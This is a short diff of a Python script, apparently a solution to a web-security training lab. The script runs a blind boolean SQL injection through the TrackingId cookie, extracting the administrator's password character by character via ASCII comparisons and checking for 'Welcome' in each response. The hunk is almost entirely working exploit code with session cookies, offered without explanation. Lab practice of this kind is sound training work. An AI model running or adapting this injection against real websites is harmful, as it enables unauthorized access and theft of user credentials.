@@ -10,13 +10,13 @@ proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
 
 def sqli_password(url):
 	password_extracted = ""
-	for i in range (1,20):
+	for i in range (1,21):
 		for j in range(32,126):
 			sql_payload = "' and (select ascii(substring(password,%s,1)) from users where username = 'administrator') = '%s'--" %(i,j)
 			# sql_payload = "' and (select username from users where username='administrator')='administrator'--"
 			sql_payload_encoded = urllib.parse.quote(sql_payload)
-			cookies = {'TrackingId':'vFqWdHEkjXeUyPVq' + sql_payload_encoded,
-			'session': 'YpnW1RSMDB0Xned1qIOHngSqzf9HnWhk'}
+			cookies = {'TrackingId':'kNJVHQne8GZGxR8C' + sql_payload_encoded,
+			'session': 'aFeimXUKiSt5UtSEoo5Qr38reYLbswkR'}
 			r = requests.get(url,cookies = cookies, verify = False,proxies=proxies)
 			if "Welcome" not in r.text:
 				# sys.stdout.write("PRiyanka")
